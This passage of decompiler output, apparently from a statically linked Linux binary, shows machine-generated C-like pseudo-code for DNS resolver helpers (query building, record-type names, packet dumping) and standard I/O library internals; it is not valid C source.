                    Vffffffe0 = 5;
                }
                L080624D0(L0805E9B8(ebx), A10);
                if(*(A10 + 24) <= *(A10 + 20)) {
                    L08061910(A10, 32);
                } else {
                    *( *(A10 + 20)) = 32;
                    *(A10 + 20) = *(A10 + 20) + 1;
                }
                Vffffffe0 = Vffffffe0 - 1;
            }
            Vfffffff0 = Vfffffff0 << 1;
            ebx = ebx + 1;
            if(bl & 7) {
                goto L0805ff14;
            }
L0805ff76:
            if(esi < Vffffffec + Vfffffff4) {
                goto L0805ff0c;
            }
            if(*(A10 + 24) <= *(A10 + 20)) {
                (save)41;
L0805ff8a:
                (save)A10;
                L08061910();
                esp = esp + 8;
            } else {
                *( *(A10 + 20)) = 41;
                *(A10 + 20) = *(A10 + 20) + 1;
            }
        }
    } else {
        L0804F680(A10, "\t?%d?", Vfffffff8);
        esi = esi + Vfffffff4;
    }
L0805ffb9:
    if(*(A10 + 24) <= *(A10 + 20)) {
        L08061910(A10, 10);
    } else {
        *( *(A10 + 20)) = 10;
        *(A10 + 20) = *(A10 + 20) + 1;
    }
    eax = esi - Vffffffec;
    if(Vfffffff4 != eax) {
        (save)Vfffffff4;
        L0804F680(A10, ";; packet size error (found %d, dlen was %d)\n", eax);
        esi = 0;
    }
    eax = esi;
L0805fff7:
    esp = ebp - 48;
}



L08060004(A8)
/* unknown */ void  A8;
{



    eax = A8 - 1;
    if(eax <= 254) {
        goto *(eax * 4 + 0x8060020)[L0806041c, L08060428, L080605b4, L080605b4, L08060434, L08060440, L0806044c, L08060458, L08060464, L08060470, L0806047c, L08060488, L08060494, L080604a0, L080604ac, L080604b8, L080604c4, L080604d0, L080604dc, L080604e8, L080604f4, L08060500, L0806050c, L08060518, L08060524, L08060530, L0806053c, L08060548, L08060554, L080605b4, L080605b4, L080605b4, L080605b4, L080605b4...]goto ( *(eax * 4 + 0x8060020));
        return("A");
        esp = ebp;
        return("NS");
        esp = ebp;
        return("CNAME");
        esp = ebp;
        return("SOA");
        esp = ebp;
        return("MB");
        esp = ebp;
        return("MG");
        esp = ebp;
        return("MR");
        esp = ebp;
        return("NULL");
        esp = ebp;
        return("WKS");
        esp = ebp;
        return("PTR");
        esp = ebp;
        return("HINFO");
        esp = ebp;
        return("MINFO");
        esp = ebp;
        return("MX");
        esp = ebp;
        return("TXT");
        esp = ebp;
        return("RP");
        esp = ebp;
        return("AFSDB");
        esp = ebp;
        return("X25");
        esp = ebp;
        return("ISDN");
        esp = ebp;
        return("RT");
        esp = ebp;
        return("NSAP");
        esp = ebp;
        return("NSAP_PTR");
        esp = ebp;
        return("SIG");
        esp = ebp;
        return("KEY");
        esp = ebp;
        return("PX");
        esp = ebp;
        return("GPOS");
        esp = ebp;
        return("AAAA");
        esp = ebp;
        return("LOC");
        esp = ebp;
        return("AXFR");
        esp = ebp;
        return("MAILB");
        esp = ebp;
        return("MAILA");
        esp = ebp;
        return("ANY");
        esp = ebp;
        return("UINFO");
        esp = ebp;
        return("UID");
        esp = ebp;
        return("GID");
    }
    L0804F808(0x807e3d8, "%d", A8);
    return(0x807e3d8);
}



L080605D0(A8)
/* unknown */ void  A8;
{



    if(A8 != 4) {
        > ? L080605e4 : ;
        if(A8 != 1) {
            goto L08060614;
            if(A8 == 255) {
                goto L08060608;
            }
            goto L08060614;
        }
        return("IN");
    }
    esp = ebp;
    return("HS");
L08060608:
    esp = ebp;
    return("ANY");
L08060614:
    L0804F808(0x807e3ec, "%d", A8);
    return(0x807e3ec);
}





L0806077C(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    eax = A8;
    if(eax == 0) {
        *L0807E428 = *"0 secs";
        *L0807E42C = *"cs";
        *L0807E42E = *"";
    } else {
        edx = 0;
        ecx = 60 / 60;
        Vfffffffc = ecx % ecx;
        edx = 0;
        Vfffffff8 = ecx / ecx % ecx / ecx;
        edx = 0;
        edi = 24 / 24 % 24 / 24;
        esi = eax;
        ebx = 0x807e428;
        if(esi != 0) {
            eax = "s";
            if(esi == 1) {
                eax = 0x8069936;
            }
            (save)eax;
            L0804F808(ebx, "%d day%s", esi);
            do {
                ebx = ebx + 1;
            } while(*ebx != 0);
        }
        if(edi != 0) {
            if(esi != 0) {
                *ebx = 32;
                ebx = ebx + 1;
            }
            eax = "s";
            if(edi == 1) {
                eax = 0x8069936;
            }
            (save)eax;
            L0804F808(ebx, "%d hour%s", edi);
            do {
                ebx = ebx + 1;
            } while(*ebx != 0);
        }
        if(Vfffffff8 != 0) {
            if(esi != 0 || edi != 0) {
                *ebx = 32;
                ebx = ebx + 1;
            }
            eax = "s";
            if(Vfffffff8 == 1) {
                eax = 0x8069936;
            }
            (save)eax;
            L0804F808(ebx, "%d min%s", Vfffffff8);
            do {
                ebx = ebx + 1;
            } while(*ebx != 0);
        }
        if(Vfffffffc != 0 || esi == 0 && edi == 0 && Vfffffff8 == 0) {
            if(esi != 0 || edi != 0 || Vfffffff8 != 0) {
                *ebx = 32;
                ebx = ebx + 1;
            }
            eax = "s";
            if(Vfffffffc == 1) {
                eax = 0x8069936;
            }
            (save)eax;
            L0804F808(ebx, "%d sec%s", Vfffffffc);
        }
    }
    esp = ebp - 20;
    return(0x807e428);
}



L080608C8(A8, Ac, A10, A14, A18, A1c, A24, A28)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A24;
/* unknown */ void  A28;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffa8;
	/* unknown */ void  Vffffffac;
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffb4;



    esi = A28;
    if(!( *L0807854C & 1) && L0804D744() == -1) {
        *L0807E788 = -1;
L080608f4:
        eax = -1;
    } else {
        if(!( *L0807854C & 2)) {
            (save)A14;
            (save)A10;
            (save)Ac;
            L0804F7EC(";; res_mkquery(%d, %s, %d, %d)\n", A8);
        }
        if(A24 == 0 || esi <= 11) {
            goto L080608f4;
        }
        L0806626C(A24, 12);
        Vffffffac = A24;
        *L08078584 = *L08078584 + 1;
        ax = *L08078584;
        asm("xchg al,ah");
        *A24 = ax;
        al = (A8 & 15) << 3;
        *(A24 + 2) = *(A24 + 2) & 135;
        *(A24 + 2) = *(A24 + 2) | al;
        *(A24 + 2) = *(A24 + 2) & 254;
        *(A24 + 2) = *(A24 + 2) | *L0807854C >> 6 & 1;
        *(A24 + 3) = *(A24 + 3) & 240;
        ebx = A24 + 12;
        esi = esi + -12;
        Vffffffb0 = A24;
        Vffffffb4 = 0;
        Vffffffa8 = ebp;
        if(A8 != 1) {
            > ? L080609a0 : ;
            if(A8 != 0 || (esi = esi + -4)) {
                goto L080608f4;
                if(A8 != 4) {
                    goto L080608f4;
                }
            }
            eax = L0804D2A0(Ac, ebx, esi, & Vffffffb0, Vffffffa8);
            if(eax < 0) {
                goto L080608f4;
            }
            ebx = ebx + eax;
            esi = esi - eax;
            L0804D700(A14 & 65535, ebx);
            ebx = ebx + 2;
            L0804D700(A10 & 65535, ebx);
            ebx = ebx + 2;
            *(Vffffffac + 4) = 256;
            if(A8 != 0 && A18 != 0) {
                esi = esi + -10;
                eax = L0804D2A0(A18, ebx, esi, & Vffffffb0, Vffffffa8);
                if(eax < 0) {
                    goto L080608f4;
                }
                ebx = ebx + eax;
                L0804D700(10, ebx);
                ebx = ebx + 2;
                L0804D700(A10 & 65535, ebx);
                ebx = ebx + 2;
                L0804D71C(0, ebx);
                ebx = ebx + 4;
                L0804D700(0, ebx);
                ebx = ebx + 2;
                *(Vffffffac + 10) = 256;
            }
        } else {
            if(esi < A1c + 11) {
                goto L080608f4;
            }
            *ebx = 0;
            ebx = ebx + 1;
            L0804D700(A14 & 65535, ebx);
            ebx = ebx + 2;
            L0804D700(A10 & 65535, ebx);
            ebx = ebx + 2;
            L0804D71C(0, ebx);
            ebx = ebx + 4;
            L0804D700(A1c & 65535, ebx);
            ebx = ebx + 2;
            if(A1c != 0) {
                L08056480(A18, ebx, A1c);
                ebx = ebx + A1c;
            }
            *(Vffffffac + 6) = 256;
        }
        eax = ebx - A24;
    }
    esp = ebp - 100;
}





L08060BD8(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    esi = Ac;
    edx = A10;
    if(edx != 0) {
        Vfffffffc = edx;
    } else {
        edx = 0x807e450;
        Vfffffffc = 0x807e450;
    }
    if(A8 > 255) {
        A8 = 255;
    }
    ebx = 0;
    if(A8 > 0) {
        if(!(A8 & 1)) {
            eax = *esi >> 4 & 255;
            ecx = edx;
            edx = edx + 1;
            al = eax <= 9 ? al + 48 : al + 55;
            *ecx = al;
            eax = *esi & 15;
            esi = esi + 1;
            ecx = edx;
            edx = edx + 1;
            al = eax <= 9 ? al + 48 : al + 55;
            *ecx = al;
            if(!(bl & 1)) {
                eax = ebx + 1;
                if(A8 > eax) {
                    *edx = 46;
                    edx = edx + 1;
                }
            }
            ebx = ebx + 1;
            if(A8 <= ebx) {
                goto L08060d13;
            }
        }
        do {
            eax = *esi >> 4 & 255;
            ecx = edx;
            edx = edx + 1;
            al = eax > 9 ? al + 55 : al + 48;
            *ecx = al;
            eax = *esi & 15;
            esi = esi + 1;
            ecx = edx;
            edx = edx + 1;
            al = eax > 9 ? al + 55 : al + 48;
            *ecx = al;
            if(!(bl & 1)) {
                eax = ebx + 1;
                if(A8 > eax) {
                    *edx = 46;
                    edx = edx + 1;
                }
            }
            Vfffffff8 = ebx + 1;
            eax = *esi >> 4 & 255;
            ecx = edx;
            edx = edx + 1;
            al = eax > 9 ? al + 55 : al + 48;
            *ecx = al;
            eax = *esi & 15;
            esi = esi + 1;
            ecx = edx;
            edx = edx + 1;
            al = eax > 9 ? al + 55 : al + 48;
            *ecx = al;
            edi = Vfffffff8;
            if(!(edi & 1)) {
                eax = edi + 1;
                if(A8 > eax) {
                    *edx = 46;
                    edx = edx + 1;
                }
            }
            ebx = ebx + 2;
        } while(A8 > ebx);
    }
L08060d13:
    *edx = 0;
    esp = ebp - 20;
    return(Vfffffffc);
}



L08060D24(A8)
/* unknown */ void  A8;
{



    *(A8 + 64) = -1;
    *A8 = *A8 | 9228;
    return(L080617C4(A8));
}



L08060D44(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    if(*(A8 + 56) < 0) {
        eax = -1;
    } else {
        (save)A8;
        edi = L08061210();
        (save)A8;
        L08062368();
        (save)A8;
        esi = *( *( *(A8 + 80) + 132))();
        (save)0;
        (save)0;
        (save)0;
        (save)A8;
        L08061B6C();
        *(A8 + 12) = 0;
        *(A8 + 4) = 0;
        *(A8 + 8) = 0;
        *(A8 + 20) = 0;
        *(A8 + 16) = 0;
        *(A8 + 24) = 0;
        L08061788(A8);
        *A8 = -72539124;
        *(A8 + 56) = -1;
        *(A8 + 64) = -1;
        eax = esi;
        if(eax == 0) {
            eax = edi;
        }
    }
}




L08060E20(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;



    edx = A10;
    ecx = 0;
    if(*(A8 + 56) < 0) {
        eax = *edx & 255;
        edx = edx + 1;
        if(eax != 114) {
            > ? L08060e4c : ;
            if(eax == 97) {
                goto L08060e74;
            }
            goto L08060e88;
            if(eax == 119) {
                goto L08060e60;
            }
        } else {
            eax = 0;
            ebx = 8;
            goto L08060e98;
L08060e60:
            eax = 1;
            ecx = 576;
            ebx = 4;
            goto L08060e98;
L08060e74:
            eax = 1;
            ecx = 1088;
            ebx = 4100;
            goto L08060e98;
        }
L08060e88:
        *L08078B14 = 22;
    }
L08060e92:
    eax = 0;
    goto L08060f03;
L08060e98:
    if(*edx == 43 || *edx == 98 && *(edx + 1) == 43) {
        eax = 2;
        ebx = ebx & 4096;
    }
    eax = open(Ac, eax | ecx, 438);
    if(eax < 0) {
        goto L08060e92;
    }
    *(A8 + 56) = eax;
    *A8 = *A8 & -4109 | ebx;
    if(!(bh & 16) && *( *( *(A8 + 80) + 68))(A8, 0, 2, 3) == -1 && *L08078B14 != 29) {
        goto L08060e92;
    }
    L080617C4(A8);
    eax = A8;
L08060f03:
}





L08060FA8(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  edi;



    if(A10 == 0) {
        eax = 0;
    } else {
        if(!( *(A8 + 1) & 16)) {
            *(A8 + 64) = -1;
        } else {
            if(*(A8 + 16) != *(A8 + 8)) {
                eax = *(A8 + 80);
                eax = *( *(eax + 124))(A8, *(A8 + 16) - *(A8 + 8), 1);
                if(eax == -1) {
                    goto L0806105c;
                }
                *(A8 + 64) = eax;
            }
        }
        eax = *(A8 + 80);
        edi = *( *(eax + 116))(A8, Ac, A10);
        if(*(A8 + 68) != 0) {
            L080620C8(( *(A8 + 68) & 65535) - 1, Ac, A10);
            *(A8 + 68) = ax + 1;
        }
        *(A8 + 12) = *(A8 + 28);
        *(A8 + 4) = *(A8 + 28);
        *(A8 + 8) = *(A8 + 28);
        eax = *(A8 + 28);
        *(A8 + 20) = eax;
        *(A8 + 16) = *(A8 + 20);
        eax = !( *A8 & 514) ? *(A8 + 28) : *(A8 + 32);
        *(A8 + 24) = eax;
        eax = 0;
        if(edi != A10) {
L0806105c:
            eax = -1;
        }
    }
}





L08061210(A8)
/* unknown */ void  A8;
{



    eax = *(A8 + 20);
    if(*(A8 + 16) < eax && L08060FA8(A8, *(A8 + 16), eax - *(A8 + 16)) != 0) {
        goto L08061256;
    }
    if(!(edx = *(A8 + 4) - *(A8 + 8))) {
        if(*( *( *(A8 + 80) + 124))(A8, edx, 1) != -1) {
            goto L08061260;
        }
        if(*L08078B14 != 29) {
L08061256:
            eax = -1;
            goto L0806126f;
L08061260:
            *(A8 + 8) = *(A8 + 4);
        }
    }
    *(A8 + 64) = -1;
    eax = 0;
L0806126f:
}




// wrapper for lseek with funky offset for file descriptor





L08061788(A8)
/* unknown */ void  A8;
{



    if(*A8 < 0) {
        edx = 0x80787f8;
        if(*L080787F8 != 0) {
            do {
                if(*edx == A8) {
                    goto L080617a8;
                }
                edx = *edx + 52;
            } while(*edx != 0);
            goto L080617ba;
L080617a8:
            eax = *(A8 + 52);
            *edx = eax;
        }
L080617ba:
        *A8 = *A8 & -129;
    }
}


L080617C4(A8)
/* unknown */ void  A8;
{



    if(*A8 >= 0) {
        *A8 = *A8 | 128;
        eax = *L080787F8;
        *(A8 + 52) = eax;
        *L080787F8 = A8;
    }
}


L080617E4(A8)
/* unknown */ void  A8;
{



    eax = A8;
    edx = *(eax + 8) - *(eax + 12);
    eax = *(eax + 48);
    do {
        if(*(eax + 8) < edx) {
            edx = *(eax + 8);
        }
        eax = *eax;
    } while(eax != 0);
    return(edx);
}


L0806180C(A8)
/* unknown */ void  A8;
{



    *A8 = *A8 & -257;
    ecx = *(A8 + 8);
    *(A8 + 8) = *(A8 + 44);
    *(A8 + 44) = ecx;
    ecx = *(A8 + 12);
    *(A8 + 12) = *(A8 + 36);
    *(A8 + 36) = ecx;
    *(A8 + 4) = *(A8 + 12);
}





L0806186C(A8)
/* unknown */ void  A8;
{



    if(*(A8 + 16) < *(A8 + 20) && *( *( *(A8 + 80) + 20))(A8, -1) == -1) {
        eax = -1;
    } else {
        if(!( *(A8 + 1) & 1)) {
            *(A8 + 12) = *(A8 + 40);
        } else {
            *(A8 + 12) = *(A8 + 28);
            eax = *(A8 + 20);
            if(*(A8 + 8) < eax) {
                *(A8 + 8) = eax;
            }
        }
        eax = *(A8 + 20);
        *(A8 + 4) = eax;
        *(A8 + 24) = eax;
        *(A8 + 20) = eax;
        *(A8 + 16) = *(A8 + 20);
        *A8 = *A8 & -2049;
        eax = 0;
    }
}



L080618D4(A8)
/* unknown */ void  A8;
{



    if(!( *(A8 + 1) & 1)) {
        L0806180C(A8);
    }
    *(A8 + 36) = 0;
    *(A8 + 44) = 0;
    *(A8 + 40) = 0;
    return(L0805C290( *(A8 + 36)));
}



L08061910(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    return(*( *( *(A8 + 80) + 20))(A8, Ac));
}



L08061928(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    esi = L080617E4(A8);
    ecx = *(A8 + 8) - *(A8 + 12) - esi;
    Vfffffffc = ecx;
    eax = *(A8 + 44) - *(A8 + 36);
    if(ecx > eax) {
        Vfffffff8 = 100;
        eax = L0805BD74(ecx + 100);
        Vfffffff4 = eax;
        if(Vfffffff4 == 0) {
            eax = -1;
            goto L08061a63;
        }
        if(esi < 0) {
            edx = ~esi;
            ebx = Vfffffff4 + Vfffffff8;
            L0805652C(ebx, *(A8 + 44) + esi, edx);
            ebx = ebx - esi;
            edx = *(A8 + 12);
            (save) *(A8 + 8) - edx;
            (save)edx;
            (save)ebx;
        } else {
            eax = *(A8 + 12) + esi;
            (save)Vfffffffc;
            (save)eax;
            (save)Vfffffff4 + Vfffffff8;
        }
        L0805652C();
        esp = esp + 12;
        if(*(A8 + 36) != 0) {
            L0805C290( *(A8 + 36));
        }
        *(A8 + 36) = Vfffffff4;
        *(A8 + 44) = Vfffffff4 + Vfffffff8 + Vfffffffc;
    } else {
        Vfffffff8 = eax - Vfffffffc;
        if(esi < 0) {
            L08056570(Vfffffff8 + *(A8 + 36), esi + *(A8 + 44), ~esi);
            edx = Vfffffff8 + *(A8 + 36) - esi;
            ecx = *(A8 + 12);
            (save) *(A8 + 8) - ecx;
            (save)ecx;
            goto L08061a3a;
        }
        if(Vfffffffc > 0) {
            edx = Vfffffff8 + *(A8 + 36);
            eax = *(A8 + 12) + esi;
            (save)Vfffffffc;
            (save)eax;
L08061a3a:
            L0805652C(edx);
        }
    }
    *(A8 + 40) = Vfffffff8 + *(A8 + 36);
    edx = *(A8 + 8) - *(A8 + 12);
    eax = *(A8 + 48);
    do {
        *(eax + 8) = *(eax + 8) - edx;
        eax = *eax;
    } while(eax != 0);
    eax = 0;
L08061a63:
    esp = ebp - 24;
}



L08061A70(A8)
/* unknown */ void  A8;
{



    if(!( *(A8 + 1) & 8) && L0806186C(A8) == -1) {
        goto L08061ac3;
    }
    eax = *(A8 + 4);
    if(*(A8 + 8) <= eax) {
        if(*(A8 + 1) & 1) {
            goto L08061ab0;
        }
        L0806180C(A8);
        eax = *(A8 + 4);
        if(*(A8 + 8) <= eax) {
            goto L08061ab0;
        }
    }
    eax = *eax & 255;
    goto L08061ae4;
L08061ab0:
    if(*(A8 + 48) != 0) {
        if(L08061928(A8) == 0) {
            goto L08061adb;
        }
L08061ac3:
        eax = -1;
    } else {
        if(*(A8 + 36) != 0) {
            L080618D4(A8);
        }
L08061adb:
        eax = *( *( *(A8 + 80) + 28))(A8);
    }
L08061ae4:
}




L08061B6C(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{



    if(*(A8 + 28) != 0 && !( *A8 & 1)) {
        eax = munmap( *(A8 + 28), *(A8 + 32) - *(A8 + 28));
    }
    *(A8 + 28) = Ac;
    *(A8 + 32) = A10;
    *A8 = A14 != 0 ? *A8 & -2 : *A8 | 1;
}







L08061D2C(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;



    return(*( *( *(A8 + 80) + 60))(A8, Ac, A10));
}








L08061F34(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    *A8 = Ac | -72548352;
    *(A8 + 28) = 0;
    *(A8 + 32) = 0;
    *(A8 + 12) = 0;
    *(A8 + 4) = 0;
    *(A8 + 8) = 0;
    *(A8 + 16) = 0;
    *(A8 + 20) = 0;
    *(A8 + 24) = 0;
    *(A8 + 52) = 0;
    *(A8 + 36) = 0;
    *(A8 + 40) = 0;
    *(A8 + 44) = 0;
    *(A8 + 48) = 0;
    *(A8 + 68) = 0;
    *(A8 + 56) = -1;
}










L080620C8(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    edx = A10 + Ac;
    if(edx > Ac) {
        ecx = edx;
        eax = Ac - edx & 3;
        if(edx > Ac) {
            if(eax == 0) {
                goto L0806210c;
            }
            if(eax < 3) {
                if(eax < 2) {
                    edx = edx - 1;
                    if(*edx == 10) {
                        goto L08062138;
                    }
                }
                edx = edx - 1;
                if(*edx == 10) {
                    goto L08062138;
                }
            }
        }
        edx = edx - 1;
        if(*edx != 10) {
            goto L08062140;
L0806210c:
            eax = edx - 1;
            if(*(edx - 1) != 10) {
                eax = edx - 2;
                if(*(edx - 2) != 10) {
                    eax = edx - 3;
                    if(*(edx - 3) != 10) {
                        goto L08062130;
                    }
                }
            }
            eax = ecx - eax - 1;
            goto L08062149;
L08062130:
            edx = edx + -4;
            if(*edx != 10) {
                goto L08062140;
            }
        }
L08062138:
        eax = ecx - edx - 1;
        goto L08062149;
L08062140:
        if(edx > Ac) {
            goto L0806210c;
        }
    }
    eax = A8 + A10;
L08062149:
}




L08062188()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    esi = 0;
    ebx = *L080787F8;
    do {
        if(*(ebx + 16) < *(ebx + 20) && *( *( *(ebx + 80) + 20))(ebx, -1) == -1) {
            esi = -1;
        }
        ebx = *(ebx + 52);
    } while(ebx != 0);
    return(esi);
}












L08062368(A8)
/* unknown */ void  A8;
{



    eax = A8;
    if(*(eax + 48) != 0) {
        *(eax + 48) = 0;
    }
    if(*(eax + 36) != 0) {
        eax = L080618D4(eax);
    }
}









L080624D0(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  edi;



    al = 0;
    edi = A8;
    asm("cld");
    ecx = -1;
    asm("repne scasb");
    edi = !ecx - 1;
    if(Ac == 0) {
L080624f2:
        *L08078B14 = 22;
        goto L08062524;
    }
    if(( *Ac & -65536) != -72548352) {
        goto L080624f2;
    }
    if(*( *( *(Ac + 80) + 52))(Ac, A8, edi) == edi) {
        eax = 1;
    } else {
L08062524:
        eax = -1;
    }
}



L08062534(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff1;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff3;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff5;
	/* unknown */ void  Vfffffff6;
	/* unknown */ void  Vfffffff7;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffff9;
	/* unknown */ void  Vfffffffa;
	/* unknown */ void  Vfffffffb;
	/* unknown */ void  Vfffffffc;
	/* unknown */ void  Vfffffffd;
	/* unknown */ void  Vfffffffe;
	/* unknown */ void  Vffffffff;



    eax = Ac;
    edi = 0;
    if(eax == 32) {
        esi = " 0000000000000000";
    } else {
        if(eax == 48) {
            esi = "0000000000000000";
        } else {
            Vffffffff = al;
            Vfffffffe = al;
            Vfffffffd = al;
            Vfffffffc = al;
            Vfffffffb = al;
            Vfffffffa = al;
            Vfffffff9 = al;
            Vfffffff8 = al;
            Vfffffff7 = al;
            Vfffffff6 = al;
            Vfffffff5 = al;
            Vfffffff4 = al;
            Vfffffff3 = al;
            Vfffffff2 = al;
            Vfffffff1 = al;
            Vfffffff0 = al;
            esi = & Vfffffff0;
        }
    }
    ebx = A10;
    do {
        edx = A8;
        eax = *( *( *(edx + 80) + 52))(edx, esi, 16);
        edi = edi + eax;
        if(eax != 16) {
            goto L080625cd;
        }
        ebx = ebx + -16;
    } while(ebx > 15);
    if(ebx > 0) {
        edx = A8;
        edi = edi + *( *( *(edx + 80) + 52))(edx, esi, ebx);
    }
L080625cd:
    eax = edi;
    esp = ebp - 28;
}



L080625DC(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    esi = A8;
    ebx = *L08078B14;
    L0805E954();
    if(esi == 0 || *esi == 0) {
        edi = "";
        esi = "";
    } else {
        edi = ": ";
    }
    if(ebx >= 0 && *"{" > ebx) {
        (save) *(ebx * 4 + 0x806ae98);
        (save)L0805E584( *L08078F9C, 1, ebx + 1);
        (save)edi;
        eax = L0804F680(0x80787a4, "%s%s%s\n", esi);
    } else {
        (save)ebx;
        (save)"Unknown error";
        (save)L0805E584( *L08078F9C, 1, 1);
        (save)edi;
        eax = L0804F680(0x80787a4, "%s%s%s %d\n", esi);
    }
}


L0806267C(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  esi;



    esi = Ac;
    if(*(A8 + 36) != 0) {
        if(A10 == 1 && !( *(A8 + 1) & 1)) {
            esi = esi - *(A8 + 8) - *(A8 + 4);
        }
        L080618D4(A8);
    }
    eax = *(A8 + 80);
    return(*( *(eax + 68))(A8, esi, A10, A14));
}



L080626C8(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    ecx = A10;
    if(A8 != 0) {
        eax = *A8 & -65536;
        if(eax == -72548352) {
            goto L080626f4;
        }
    }
    *L08078B14 = 22;
    goto L0806270b;
L080626f4:
    *A8 = *A8 & -513;
    if(Ac == 0) {
        ecx = 0;
    }
    eax = *( *( *(A8 + 80) + 84))(A8, Ac, ecx);
L0806270b:
}



L08062714(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = "0123456789abcdefghijklmnopqrstuvwxyz";
    if(A18 != 0) {
        Vfffffffc = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    }
    edi = A10;
    if(A14 != 10) {
        > ? L0806274c : ;
        if(A14 == 8) {
            goto L080627e8;
        }
        goto L0806282c;
        if(A14 == 16) {
            goto L080627a0;
        }
    } else {
L08062758:
        do {
            edi = edi - 1;
            *edi = *(L0806744C(A8, Ac, 10, 0) + Vfffffffc);
            A8 = L08067344(A8, Ac, 10, 0);
            Ac = A14;
            if(A8 != 0) {
                goto L08062758;
            }
        } while(Ac != 0);
        goto L08062879;
L080627a0:
        edi = edi - 1;
        *edi = *(L0806744C(A8, Ac, 16, 0) + Vfffffffc);
        A8 = L08067344(A8, Ac, 16, 0);
        Ac = A14;
        if(A8 != 0 || Ac != 0) {
            goto L080627a0;
        }
        goto L08062879;
L080627e8:
        do {
            edi = edi - 1;
            *edi = *(L0806744C(A8, Ac, 8, 0) + Vfffffffc);
            A8 = L08067344(A8, Ac, 8, 0);
            Ac = A14;
            if(A8 != 0) {
                goto L080627e8;
            }
        } while(Ac != 0);
        goto L08062879;
    }
L0806282c:
    ecx = A14;
    Vfffffff4 = ecx;
    Vfffffff8 = 0;
L08062838:
    do {
        edi = edi - 1;
        *edi = *(L0806744C(A8, Ac, Vfffffff4, Vfffffff8) + Vfffffffc);
        eax = L08067344(A8, Ac, Vfffffff4, Vfffffff8);
        A8 = eax;
        Ac = A14;
        if(A8 != 0) {
            goto L08062838;
        }
    } while(A14 != 0);
L08062879:
    eax = edi;
    esp = ebp - 24;
}



L08062888(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;



    return(L080628A8(A8, Ac, A10, & A14));
}


L080628A8(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffa0;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vfffffff0;



    esi = & Vffffffa0;
    L08061F34(esi, 0);
    Vfffffff0 = 0x80787fc;
    L08052E80(esi, A8, Ac - 1, A8);
    edx = L0804F888(esi, A10, A14);
    *Vffffffb4 = 0;
    eax = edx;
    esp = ebp - 108;
}



L080628F8(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = ecx;
    al = 0;
    edi = A8;
    asm("cld");
    ecx = -1;
    asm("repne scasb");
    ebx = !ecx;
    edi = L0805BD74(ebx);
    if(edi != 0) {
        L0805652C(edi, A8, ebx);
        eax = edi;
    } else {
        eax = 0;
    }
    esp = ebp - 16;
}


L08062940(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
